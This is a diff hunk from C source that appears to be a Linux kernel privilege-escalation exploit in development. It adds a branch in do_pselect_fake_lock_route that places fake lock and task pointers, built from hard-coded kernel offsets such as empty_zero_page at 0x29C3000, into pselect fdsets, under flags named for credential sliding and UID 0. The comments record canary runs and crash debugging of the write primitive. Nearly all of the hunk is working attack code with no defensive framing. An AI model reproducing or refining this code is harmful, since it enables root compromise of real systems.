@@ -1977,6 +1977,30 @@ void do_pselect_fake_lock_route(void) {
      * stage directly into the fdsets. settle = all-benign (re-link);
      * write = only-right (parent=target-8, child=value, rotating lock).
      */
+    if (!g_resurge_stage && env_flag("MODE4_SLIDE_CRED", 0) &&
+        env_flag("UID0_EZP", 0)) {
+      /* ONE-SHOT + empty_zero_page: the 08-30 canary proved one-shot
+       * stores LAND; the bss_tail lock was poisoning init_pg_dir AFTER
+       * the store (the crash was post-write, not the erase). Keep the
+       * chain's only-left words; redirect lock/task to ezp. */
+      uint64_t ezp_off = 0x29C3000ULL;
+      uint64_t wlock = data_addr(KIMAGE_TEXT_BASE + ezp_off + 0x100);
+      uint64_t wtask = data_addr(KIMAGE_TEXT_BASE + ezp_off + 0x800);
+      int wps = pselect_words_per_set();
+      uint64_t w0 = 0, w1 = 0, w2 = 0;
+      /* read back the chain's tree words from the placed fdsets */
+      w0 = fdset_get_word(&in, 0);
+      w1 = fdset_get_word(&in, 1);
+      w2 = fdset_get_word(&in, 2);
+      pselect_put_waiter_word(&in, &out, &ex, wps, 6, wtask, "otask");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 7, wlock, "olock");
+      pr_info("ONE-SHOT EZP: tree w0=%016llx w1=%016llx w2=%016llx "
+              "lock=%016llx task=%016llx
+",
+              (unsigned long long)w0, (unsigned long long)w1,
+              (unsigned long long)w2, (unsigned long long)wlock,
+              (unsigned long long)wtask);
+    }
     if (g_resurge_stage) {
       /* empty_zero_page (kallsyms 0x29C3000) — GUARANTEED zeroed.
        * bss_tail was NEVER safe: init_pg_dir sits at bss_tail+0x300
